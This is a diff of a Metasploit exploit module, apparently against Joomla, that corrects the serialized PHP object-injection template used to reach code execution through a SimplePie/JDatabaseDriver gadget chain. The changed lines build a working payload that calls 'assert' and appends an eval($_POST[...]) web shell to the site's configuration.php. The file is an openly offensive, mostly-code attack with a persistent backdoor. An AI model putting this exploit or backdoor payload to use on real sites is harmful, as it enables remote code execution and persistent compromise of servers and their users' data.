@@ -89,7 +89,7 @@ class MetasploitModule < Msf::Exploit::Remote
   def get_payload(function, payload)
 	  # @function: The PHP Function
 	  # @payload: The payload for the call
-	  template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
+	  template = 's:11:"maonnalezzo";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
 	  # The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values
 	  payload = 'http://l4m3rz.l337/;' + payload
 	  final = template.gsub('PAYLOAD',payload).gsub('LENGTH', payload.length.to_s).gsub('FUNC_NAME', function).gsub('FUNC_LEN', function.length.to_s)
@@ -103,7 +103,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	# As said in other part of the code. we cannot create new .php file because we cannot use 
 	# the ? character because of the check on URI schema
 	function = 'assert'
-        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'                                                             
+        template = 's:11:"maonnalezzo";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'                                                             
         # This payload will append an eval() at the end of the configuration file                                                                            
         payload =  "file_put_contents('configuration.php','if(isset($_POST[\\'"+param_name+"\\'])) eval($_POST[\\'"+param_name+"\\']);', FILE_APPEND) || $a=\'http://wtf\';"
 	template['PAYLOAD']  = payload 
